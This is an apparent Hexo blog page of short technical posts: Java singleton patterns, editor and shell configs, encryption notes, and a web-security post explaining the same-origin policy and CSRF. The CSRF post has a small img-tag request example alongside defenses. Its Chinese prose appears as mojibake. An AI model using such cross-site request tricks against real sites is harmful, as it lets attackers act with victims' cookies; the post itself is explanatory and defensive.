    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/11/10/character-coding/" data-id="ckqhp9u6u000u3ot0ema249yh" data-title="ASCII,GB2312,Unicode,UTF8,UTF16" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-design-pattern" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/10/10/design-pattern/" class="article-date">
  <time class="dt-published" datetime="2020-10-10T17:29:35.000Z" itemprop="datePublished">2020-10-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/10/10/design-pattern/">è®¾è®¡æ¨¡å¼</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="GOF-group-of-four-å››äººå¸®-å›½å¤–å¤§ç‰›æ€»ç»“å‡º23ç§å¥—è·¯ã€‚"><a href="#GOF-group-of-four-å››äººå¸®-å›½å¤–å¤§ç‰›æ€»ç»“å‡º23ç§å¥—è·¯ã€‚" class="headerlink" title="GOF: group of four å››äººå¸®, å›½å¤–å¤§ç‰›æ€»ç»“å‡º23ç§å¥—è·¯ã€‚"></a>GOF: group of four å››äººå¸®, å›½å¤–å¤§ç‰›æ€»ç»“å‡º23ç§å¥—è·¯ã€‚</h1><ul>
<li>åˆ›å»ºå‹æ¨¡å¼ï¼šå•ä¾‹æ¨¡å¼ï¼Œå·¥å‚æ¨¡å¼ï¼ŒæŠ½è±¡å·¥å‚æ¨¡å¼ï¼Œå»ºé€ è€…æ¨¡å¼ï¼ŒåŸå‹æ¨¡å¼</li>
<li>ç»“æ„å‹æ¨¡å¼ï¼šé€‚é…å™¨æ¨¡å¼ï¼Œæ¡¥æ¥æ¨¡å¼ï¼Œè£…é¥°æ¨¡å¼ï¼Œç»„åˆæ¨¡å¼ï¼Œå¤–è§‚æ¨¡å¼ï¼Œäº«å…ƒæ¨¡å¼ï¼Œä»£ç†æ¨¡å¼</li>
<li>è¡Œä¸ºå‹æ¨¡å¼ï¼šæ¨¡æ¿æ–¹æ³•æ¨¡å¼ï¼Œå‘½ä»¤æ¨¡å¼ï¼Œè¿­ä»£å™¨æ¨¡å¼ï¼Œè§‚å¯Ÿè€…æ¨¡å¼ï¼Œä¸­ä»‹è€…æ¨¡å¼ï¼Œå¤‡å¿˜å½•æ¨¡å¼ï¼Œè§£é‡Šå™¨æ¨¡å¼ï¼ŒçŠ¶æ€æ¨¡å¼ï¼Œç­–ç•¥æ¨¡å¼ï¼ŒèŒè´£é“¾æ¨¡å¼ï¼Œè®¿é—®è€…æ¨¡å¼</li>
</ul>
<h1 id="å•ä¾‹æ¨¡å¼"><a href="#å•ä¾‹æ¨¡å¼" class="headerlink" title="å•ä¾‹æ¨¡å¼"></a>å•ä¾‹æ¨¡å¼</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * é¥¿æ±‰å•ä¾‹æ¨¡å¼</span><br><span class="line"> */</span><br><span class="line">public class Singleton &#123;</span><br><span class="line"></span><br><span class="line">    // ç±»åˆå§‹åŒ–æ—¶ï¼Œç«‹å³åŠ è½½è¿™ä¸ªå¯¹è±¡ (ç”±äºåŠ è½½ç±»æ—¶ï¼Œå¤©ç„¶çš„çº¿ç¨‹å®‰å…¨, ä¸éœ€è¦åŒæ­¥)</span><br><span class="line">    private static Singleton instance = new Singleton();</span><br><span class="line"></span><br><span class="line">    private Singleton() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // æ–¹æ³•æ²¡æœ‰åŒæ­¥ï¼Œè°ƒç”¨æ•ˆç‡é«˜</span><br><span class="line">    public static Singleton getInstance() &#123;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * æ‡’æ±‰å•ä¾‹æ¨¡å¼</span><br><span class="line"> */</span><br><span class="line">class Singleton2 &#123;</span><br><span class="line"></span><br><span class="line">    private static Singleton2 instance;</span><br><span class="line"></span><br><span class="line">    private Singleton2() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    public static synchronized Singleton2 getInstance() &#123;</span><br><span class="line">        if (instance == null) &#123;</span><br><span class="line">            instance = new Singleton2();</span><br><span class="line">        &#125;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * é™æ€å†…éƒ¨ç±»,ä¹Ÿæ˜¯ä¸€ç§æ‡’æ±‰å•ä¾‹æ¨¡å¼</span><br><span class="line"> */</span><br><span class="line">class Singleton3 &#123;</span><br><span class="line"></span><br><span class="line">    private static class SingletonClassInstance &#123;</span><br><span class="line">        private static final Singleton3 instance = new Singleton3();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private Singleton3() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    public static Singleton3 getInstance() &#123;</span><br><span class="line">        return SingletonClassInstance.instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * æšä¸¾æœ¬èº«å°±æ˜¯å•ä¾‹æ¨¡å¼, JVMä¿è¯(æ²¡æœ‰å»¶æ—¶åŠ è½½)</span><br><span class="line"> */</span><br><span class="line">enum Singleton4 &#123;</span><br><span class="line"></span><br><span class="line">    // è¿™ä¸ªæšä¸¾å…ƒç´ æœ¬èº«å°±æ˜¯å•ä¾‹å¯¹è±¡</span><br><span class="line">    INSTANCE;</span><br><span class="line"></span><br><span class="line">    public void singletonOperation() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * newä¸€ä¸ªå¯¹è±¡åŠåˆå§‹åŒ–,åŠ volatileé˜²æ­¢æŒ‡ä»¤é‡æ’åº</span><br><span class="line"> * å¦‚æœä¸åŠ volatile, thread 2 åˆ¤æ–­ if (instance != null) å, ä¼šä½¿ç”¨äº†åŠåˆå§‹åŒ–çš„å¯¹è±¡</span><br><span class="line"> */</span><br><span class="line">class DclSingleton &#123;</span><br><span class="line">    private static volatile DclSingleton instance;</span><br><span class="line">    public static DclSingleton getInstance() &#123;</span><br><span class="line">        if (instance == null) &#123;</span><br><span class="line">            synchronized (DclSingleton .class) &#123;</span><br><span class="line">                if (instance == null) &#123;</span><br><span class="line">                    instance = new DclSingleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // private constructor and other methods...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é€šè¿‡åå°„æ–¹å¼ç›´æ¥è°ƒç”¨ç§æœ‰æ„é€ å™¨"><a href="#é€šè¿‡åå°„æ–¹å¼ç›´æ¥è°ƒç”¨ç§æœ‰æ„é€ å™¨" class="headerlink" title="é€šè¿‡åå°„æ–¹å¼ç›´æ¥è°ƒç”¨ç§æœ‰æ„é€ å™¨"></a>é€šè¿‡åå°„æ–¹å¼ç›´æ¥è°ƒç”¨ç§æœ‰æ„é€ å™¨</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;Singleton&gt; clazz = (Class&lt;Singleton&gt;) Class.forName(&quot;Singleton&quot;);</span><br><span class="line">Constructor&lt;Singleton&gt; cons = clazz.getDeclaredConstructor(null);</span><br><span class="line">cons.setAccessible(true);</span><br><span class="line">Singleton s3 = cons.newInstance();</span><br><span class="line">Singleton s4 = cons.newInstance();</span><br><span class="line">System.out.println(s3);</span><br><span class="line">System.out.println(s4);</span><br><span class="line">// Singleton@610455d6</span><br><span class="line">// Singleton@511d50c0</span><br></pre></td></tr></table></figure>

<h2 id="é˜²æ­¢åˆ©ç”¨åå°„"><a href="#é˜²æ­¢åˆ©ç”¨åå°„" class="headerlink" title="é˜²æ­¢åˆ©ç”¨åå°„"></a>é˜²æ­¢åˆ©ç”¨åå°„</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private Singleton() &#123; // ç¬¬äºŒæ¬¡è°ƒç”¨å°±æŠ›å‡ºå¼‚å¸¸</span><br><span class="line">       if (instance != null) throw new RuntimeException();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/10/10/design-pattern/" data-id="ckqhp9u6w000z3ot00ea6h1wx" data-title="è®¾è®¡æ¨¡å¼" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JVM/" rel="tag">JVM</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-zsh-vim-tmux-config" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/08/30/zsh-vim-tmux-config/" class="article-date">
  <time class="dt-published" datetime="2020-08-30T16:20:30.000Z" itemprop="datePublished">2020-08-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/08/30/zsh-vim-tmux-config/">zsh/vim/tmux é…ç½®</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">set nocompatible              &quot; be iMproved, required</span><br><span class="line">set nu</span><br><span class="line">set backspace=2</span><br><span class="line">set foldmethod=syntax</span><br><span class="line">set foldclose=all</span><br><span class="line">set ignorecase</span><br><span class="line">set smartcase</span><br><span class="line"></span><br><span class="line">syntax on</span><br><span class="line"></span><br><span class="line">imap &lt;C-n&gt; &lt;Down&gt;</span><br><span class="line">imap &lt;C-p&gt; &lt;Up&gt;</span><br><span class="line">imap &lt;C-@&gt; &lt;C-Space&gt;</span><br><span class="line"></span><br><span class="line">filetype off                  &quot; required</span><br><span class="line">&quot; set the runtime path to include Vundle and initialize</span><br><span class="line">set rtp+=~/.vim/bundle/Vundle.vim</span><br><span class="line">call vundle#begin()</span><br><span class="line">&quot; alternatively, pass a path where Vundle should install plugins</span><br><span class="line">&quot;call vundle#begin(&#x27;~/some/path/here&#x27;)</span><br><span class="line"></span><br><span class="line">&quot; let Vundle manage Vundle, required</span><br><span class="line">Plugin &#x27;VundleVim/Vundle.vim&#x27;</span><br><span class="line">Plugin &#x27;tomtom/tcomment_vim&#x27;</span><br><span class="line">Plugin &#x27;itchyny/lightline.vim&#x27;</span><br><span class="line">Plugin &#x27;octol/vim-cpp-enhanced-highlight&#x27;</span><br><span class="line">Plugin &#x27;907th/vim-auto-save&#x27;</span><br><span class="line"></span><br><span class="line">&quot; All of your Plugins must be added before the following line</span><br><span class="line">call vundle#end()            &quot; required</span><br><span class="line">filetype plugin indent on    &quot; required</span><br><span class="line">&quot; To ignore plugin indent changes, instead use:</span><br><span class="line">&quot;filetype plugin on</span><br><span class="line">&quot;</span><br><span class="line">&quot; Brief help</span><br><span class="line">&quot; :PluginList       - lists configured plugins</span><br><span class="line">&quot; :PluginInstall    - installs plugins; append `!` to update or just :PluginUpdate</span><br><span class="line">&quot; :PluginSearch foo - searches for foo; append `!` to refresh local cache</span><br><span class="line">&quot; :PluginClean      - confirms removal of unused plugins; append `!` to auto-approve removal</span><br><span class="line">&quot;</span><br><span class="line">&quot; see :h vundle for more details or wiki for FAQ</span><br><span class="line">&quot; Put your non-Plugin stuff after this line</span><br><span class="line"></span><br><span class="line">autocmd FileType cpp nmap &lt;buffer&gt; &lt;F9&gt; :w&lt;bar&gt;! g++ -W -std=c++0x -o %:t:r %:t &amp;&amp; ./%:t:r &lt;Cr&gt;</span><br><span class="line">autocmd FileType python nmap &lt;buffer&gt; &lt;F9&gt; :w&lt;bar&gt;! python %:t &lt;Cr&gt;</span><br><span class="line">autocmd FileType cpp nmap &lt;buffer&gt; &lt;F10&gt; :w&lt;bar&gt;! g++ -W -std=c++0x -o %:t:r %:t &amp;&amp; ./%:t:r &lt; in&lt;Cr&gt;</span><br><span class="line">let g:auto_save = 1  &quot; enable AutoSave on Vim startup</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h2><p>from <a target="_blank" rel="noopener" href="https://github.com/gpakosz/.tmux">https://github.com/gpakosz/.tmux</a><br>åœ¨.tmux.conf.localæœ«å°¾æ·»åŠ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># move status line to top</span><br><span class="line">#set -g status-position top</span><br><span class="line">tmux_conf_theme_status_left=&#x27;  #S | &#x27;</span><br><span class="line">tmux_conf_theme_status_right=&#x27;#&#123;prefix&#125;#&#123;pairing&#125;#&#123;synchronized&#125;, %R , %d %b |&#x27;</span><br><span class="line">tmux_conf_theme_status_left_bg=&#x27;#00afff,#00afff,#00afff&#x27;</span><br><span class="line">set-option -g repeat-time 1</span><br><span class="line">set-option -g status-position top</span><br><span class="line">set-window-option -g mode-keys vi</span><br></pre></td></tr></table></figure>

<h2 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h2><p>install zsh, oh-my-zsh</p>
<p>use custom theme <code>powerlevel9k/powerlevel9k</code><br><a target="_blank" rel="noopener" href="https://github.com/Powerlevel9k/powerlevel9k/wiki/Install-Instructions#arch-linux">https://github.com/Powerlevel9k/powerlevel9k/wiki/Install-Instructions#arch-linux</a></p>
<p>åŠ å…¥æ’ä»¶ ~/.zshrc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># plugins=(git)</span><br><span class="line">plugins=(</span><br><span class="line">	zsh-syntax-highlighting</span><br><span class="line">	zsh-autosuggestions</span><br><span class="line">	autojump</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/08/30/zsh-vim-tmux-config/" data-id="ckqhp9u71001m3ot0ahqb2b9f" data-title="zsh/vim/tmux é…ç½®" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-network" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/08/06/network/" class="article-date">
  <time class="dt-published" datetime="2020-08-07T06:50:02.000Z" itemprop="datePublished">2020-08-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/08/06/network/">TCP/IP</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dGhlIHNhbXBsZSBub25jZQ==258EAFA5-E914-47DA-95CA-C5AB0DC85B11</span><br></pre></td></tr></table></figure>

<p>b37a4f2cc0624f1690f64606cf385945b2bec4ea</p>
<h2 id="Hardware-and-Software-Orgnization-of-an-Internet-Application"><a href="#Hardware-and-Software-Orgnization-of-an-Internet-Application" class="headerlink" title="Hardware and Software Orgnization of an Internet Application"></a>Hardware and Software Orgnization of an Internet Application</h2><p><img src="/images/network/org.png"></p>
<p>socket addresss: <strong>IPaddresss:port pair</strong></p>
<p>A <strong>port</strong> is a 16-bit integer that identifies a process</p>
<ul>
<li>Ephemeral port: Assigned automatically by client kernel when client makes a connection request</li>
<li>Well-known port: Associated with some service provided by a server</li>
</ul>
<p><img src="/images/network/overview.png" alt="stack"><br><img src="/images/network/https.png" alt="stack"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/08/06/network/" data-id="ckqhp9u6x00123ot0czev334t" data-title="TCP/IP" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-crypto" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/08/06/crypto/" class="article-date">
  <time class="dt-published" datetime="2020-08-07T04:51:31.000Z" itemprop="datePublished">2020-08-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/08/06/crypto/">å¯¹ç§°åŠ å¯†/éå¯¹ç§°åŠ å¯†</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><strong>å…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†ï¼šä¼ è¾“åªç»™ç§é’¥æŒæœ‰è€…çœ‹åˆ°çš„ä¿¡æ¯</strong><br><strong>ç§é’¥åŠ å¯†ï¼Œå…¬é’¥è§£å¯†ï¼šä¿¡æ¯å…¬å¼€ï¼Œä½†æ˜¯æ— æ³•è¢«ä¸­é—´äººç¯¡æ”¹</strong></p>
<blockquote>
<p>å¯¹ç§°åŠ å¯†ï¼Œç”¨åŒä¸€ä¸ªå¯†ç åŠ å¯†å’Œè§£å¯†ã€‚<br>ç¼ºç‚¹ï¼šå¯†ç è¢«ä¸­é—´äººæˆªå–</p>
</blockquote>
<blockquote>
<p>éå¯¹ç§°åŠ å¯†ï¼Œå®¢æˆ·ç«¯å…¬é’¥åŠ å¯†{å¯¹ç§°åŠ å¯†ç”¨åˆ°çš„å¯†ç }ï¼ŒæœåŠ¡å™¨ç«¯ç§é’¥è§£å¯†ã€‚<br>ç¼ºç‚¹ï¼šè·å–æœåŠ¡å™¨å…¬é’¥çš„æ—¶å€™ï¼Œè¢«ä¸­é—´äººæ›¿æ¢æ›¿æ¢<br>å¯ä»¥æš´åŠ›ç ´è§£å—ï¼Ÿæ— æ„ä¹‰ï¼Œå¯†ç ä¸€æ®µæ—¶é—´è¿‡æœŸä¼šæ›¿æ¢ï¼Œå³ä¾¿çˆ†ç ´æˆåŠŸå¯†ç ä¹Ÿä¼šå˜åŒ–ã€‚</p>
</blockquote>
<blockquote>
<p>CA: å®¢æˆ·ç«¯ä»CAè·å–è®¤è¯çš„æœåŠ¡å™¨å…¬é’¥ã€‚åŸŸåè®¤è¯ç›¸åº”çš„å…¬é’¥ï¼Œéœ€è¦æä¾›æ³•äººä¿¡æ¯ï¼Œå¹¶åœ¨æœåŠ¡å™¨ä¸Šæ”¾ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²è¯æ˜æœåŠ¡å™¨æ˜¯è‡ªå·±çš„ã€‚<br>CAç§é’¥åŠ å¯†{éå¯¹ç§°åŠ å¯†ç”¨åˆ°çš„å…¬é’¥}ï¼Œå®¢æˆ·ç«¯ç”¨CAå…¬é’¥è§£å¯†ï¼ˆå·²ç»å­˜å‚¨åœ¨æµè§ˆå™¨ä¸­ï¼‰ã€‚<br>å¥½å¤„ï¼šæ— æ³•è¢«ä¸­é—´äººç¯¡æ”¹ï¼ŒCAå…¬é’¥è§£å¯†åä¸­é—´äººæ²¡æœ‰CAç§é’¥æ— æ³•å†æ¬¡åŠ å¯†</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/08/06/crypto/" data-id="ckqhp9u6v000x3ot0aa1k8uns" data-title="å¯¹ç§°åŠ å¯†/éå¯¹ç§°åŠ å¯†" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-web-security" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/06/15/web-security/" class="article-date">
  <time class="dt-published" datetime="2020-06-16T00:05:45.000Z" itemprop="datePublished">2020-06-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/06/15/web-security/">web security</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="åŒæºåè®®ï¼ˆSOP"><a href="#åŒæºåè®®ï¼ˆSOP" class="headerlink" title="åŒæºåè®®ï¼ˆSOP)"></a>åŒæºåè®®ï¼ˆSOP)</h1><p>æ‰€è°“çš„åŒæºåè®®ï¼Œå°±æ˜¯é˜»æ­¢ç¨‹åºå‘˜è®¿é—®ç¬¬ä¸‰æ–¹æ•°æ®çš„ä¸€ç§æ‰‹æ®µï¼Œå¯¹æµè§ˆå™¨æœ¬èº«æ˜¯æ²¡æœ‰ä»»ä½•çš„å½±å“ã€‚æ¢å¥è¯è¯´ï¼Œå›¾ç‰‡è¯¥æ˜¾ç¤ºæ˜¾ç¤ºï¼Œä½†ä½ æ— æ³•è·å–åˆ°å®ƒçš„äºŒè¿›åˆ¶ï¼Œiframeè¯¥å±•ç¤ºå±•ç¤ºï¼Œä½†ä½ è·å–ä¸åˆ°å®ƒçš„èŠ‚ç‚¹ï¼Œajaxè¯¥è¯»å–è¯»å–ï¼Œä½†ä½ è·å–ä¸åˆ°å®ƒçš„å“åº”æ–‡ã€‚</p>
<p>åŒæºåè®®å¯ä»¥</p>
<ul>
<li>è·¨åŸŸå†™æ“ä½œ</li>
<li>è·¨åŸŸåµŒå…¥æ“ä½œ<br>ä¸å¯ä»¥</li>
<li>è·¨åŸŸè¯»æ“ä½œ</li>
</ul>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>ï¼ˆCross-site request forgeryï¼‰è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ç§å¸¸è§çš„æ”»å‡»æ–¹å¼ã€‚æ˜¯æŒ‡ A ç½‘ç«™æ­£å¸¸ç™»é™†åï¼Œcookie æ­£å¸¸ä¿å­˜ï¼Œå…¶ä»–ç½‘ç«™ B é€šè¿‡æŸç§æ–¹å¼è°ƒç”¨ A ç½‘ç«™æ¥å£è¿›è¡Œæ“ä½œï¼ŒA çš„æ¥å£åœ¨è¯·æ±‚æ—¶ä¼šè‡ªåŠ¨å¸¦ä¸Š cookieã€‚<br>ä¸Šé¢è¯´äº†ï¼ŒSOP å¯ä»¥é€šè¿‡ html tag åŠ è½½èµ„æºï¼Œè€Œä¸” SOP ä¸é˜»æ­¢æ¥å£è¯·æ±‚è€Œæ˜¯æ‹¦æˆªè¯·æ±‚ç»“æœï¼ŒCSRF æ°æ°å äº†è¿™ä¸¤ä¸ªä¾¿å®œã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// ä½¿ç”¨xhrè¯·æ±‚ä¼šå—åˆ°sopé™åˆ¶ï¼Œä¸ä¼šå¸¦ä¸Šcookie</span><br><span class="line"> &lt;script&gt;</span><br><span class="line">        var xhr = new XMLHttpRequest();</span><br><span class="line">        xhr.onreadystatechange = function() &#123;//æœåŠ¡å™¨è¿”å›å€¼çš„å¤„ç†å‡½æ•°ï¼Œæ­¤å¤„ä½¿ç”¨åŒ¿åå‡½æ•°è¿›è¡Œå®ç°</span><br><span class="line">            if (xhr.readyState == 4 &amp;&amp; xhr.status == 200) &#123;//</span><br><span class="line">                var responseText = xhr.responseText;</span><br><span class="line">                document.getElementById(&#x27;result&#x27;).innerHTML = responseText;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xhr.open(&quot;GET&quot;, &quot;http://dummy.restapiexample.com/api/v1/employees&quot;, true);//æäº¤getè¯·æ±‚åˆ°æœåŠ¡å™¨</span><br><span class="line">        xhr.send(null);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  // ä½¿ç”¨imgçš„tagè¯·æ±‚ä¼šå¸¦ä¸Šcookie</span><br><span class="line">    &lt;img src=&quot;http://dummy.restapiexample.com/api/v1/employees&quot;/&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>CSRFè‡ªåŠ¨é˜²å¾¡ç­–ç•¥ï¼šåŒæºæ£€æµ‹ï¼ˆOrigin å’Œ Referer éªŒè¯ï¼‰ã€‚</li>
<li>CSRFä¸»åŠ¨é˜²å¾¡æªæ–½ï¼šTokenéªŒè¯ æˆ–è€… åŒé‡CookieéªŒè¯ ä»¥åŠé…åˆSamesite Cookieã€‚</li>
<li>ä¿è¯é¡µé¢çš„å¹‚ç­‰æ€§ï¼Œåç«¯æ¥å£ä¸è¦åœ¨GETé¡µé¢ä¸­åšç”¨æˆ·æ“ä½œã€‚</li>
</ul>
<p>samesite cookie</p>
